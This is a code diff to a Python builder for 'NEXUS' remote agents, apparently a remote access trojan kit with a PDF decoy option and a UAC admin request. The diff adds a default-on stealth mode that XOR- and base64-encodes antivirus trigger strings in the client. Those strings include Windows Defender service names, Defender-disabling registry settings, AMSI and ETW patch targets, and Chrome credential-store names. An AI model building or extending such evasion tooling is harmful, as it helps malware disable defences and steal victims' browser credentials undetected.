@@ -3,7 +3,7 @@
 NEXUS Remote Manager — Configure, build, and manage agents.
 """
 
-import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re
+import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re, base64
 from pathlib import Path
 
 CONFIG_FILE = "manager_config.json"
@@ -15,11 +15,15 @@ DEFAULTS = {
     "console": False,
     "uac_admin": False,
     "icon": "",
-    "upx": True,
+    "upx": False,
     "onefile": True,
     "use_pdf": False,
     "pdf_path": "",
+    "stealth": True,
 }
+
+# XOR key must match the one in client.py
+_OBF_KEY = b"\x9e\xa3\x7c\xd1\x45\x08\xfb\x9a\x62\x3e\xc0\x77\x1a\xe4\x5b\x8f"
 
 SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
 a = Analysis(
@@ -139,6 +143,49 @@ class Manager:
         print(f"  [+] Generated {spec_file}")
         return spec_file
 
+    def _xobf(self, s):
+        k = _OBF_KEY
+        raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
+        return base64.b64encode(raw).decode()
+
+    _TRIGGER_STRINGS = [
+        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "WinSvcUpdate",
+        "WindowsServiceUpdater", "DisableAntiSpyware", "DisableRealtimeMonitoring",
+        "DisableBehaviorMonitoring", "DisableBlockAtFirstSeen", "DisableIOAVProtection",
+        "DisablePrivacyMode", "DisableArchiveScanning", "DisableIntrusionPreventionSystem",
+        "DisableScriptScanning", "SignatureDisableUpdateOnStartupWithoutEngine",
+        "SubmitSamplesConsent", "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect",
+        "MpPreference", "Add-MpPreference", "Set-MpPreference", "WinDefend",
+        "Global\\WinSvcUpdate", "Login Data", "Local State", "os_crypt", "encrypted_key",
+        "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
+        "WinSvcUpdateIdle", "Windows Service Update Manager",
+    ]
+
+    def _obfuscate_client(self):
+        backup = Path("client.py.bak")
+        orig = Path("client.py")
+        if backup.exists():
+            orig.write_text(backup.read_text("utf-8"), "utf-8")
+        else:
+            backup.write_text(orig.read_text("utf-8"), "utf-8")
+
+        if not self.config.get("stealth"):
+            return
+
+        src = orig.read_text("utf-8")
+        changed = 0
+        for plain in self._TRIGGER_STRINGS:
+            obf = self._xobf(plain)
+            count = src.count(f'"{plain}"')
+            if count:
+                src = src.replace(f'"{plain}"', f'_s("{obf}")')
+                changed += count
+        if changed:
+            orig.write_text(src, "utf-8")
+            print(f"  [+] Obfuscated {changed} trigger strings in client.py")
+        else:
+            print("  [-] No trigger strings to obfuscate (already done?)")
+
     def _find_pyinstaller(self):
         candidates = ["pyinstaller", "pyinstaller3"]
         for c in candidates:
@@ -155,6 +202,7 @@ class Manager:
 
     def build_agent(self):
         print("\n--- Building Standalone Agent ---")
+        self._obfuscate_client()
         self.patch_client()
         spec = self.generate_spec()
 
@@ -238,6 +286,7 @@ class Manager:
             ("7", "UPX compress", "Yes" if c["upx"] else "No"),
             ("8", "Single file", "Yes" if c["onefile"] else "No"),
             ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
+            ("0", "Stealth obfuscation", "Yes" if c["stealth"] else "No"),
         ]
         for k, label, val in items:
             print(f"  [{k}] {label:17s} {val}")
@@ -288,6 +337,8 @@ class Manager:
                             print("  [!] File not found")
                     elif not c["pdf_path"]:
                         c["use_pdf"] = False
+            elif ch == "0":
+                c["stealth"] = not c["stealth"]
             elif ch == "s":
                 self.save_config()
                 self.start_server()
@@ -317,9 +368,15 @@ def main():
     parser.add_argument("--console", action="store_true", help="Show console window")
     parser.add_argument("--uac", action="store_true", help="Request UAC admin")
     parser.add_argument("--icon", help="Icon .ico file")
+    parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
+    parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
     args = parser.parse_args()
 
     m = Manager()
+    if args.no_stealth:
+        m.config["stealth"] = False
+    if args.stealth:
+        m.config["stealth"] = True
     if args.build:
         if ":" in args.build:
             ip, port = args.build.split(":", 1)
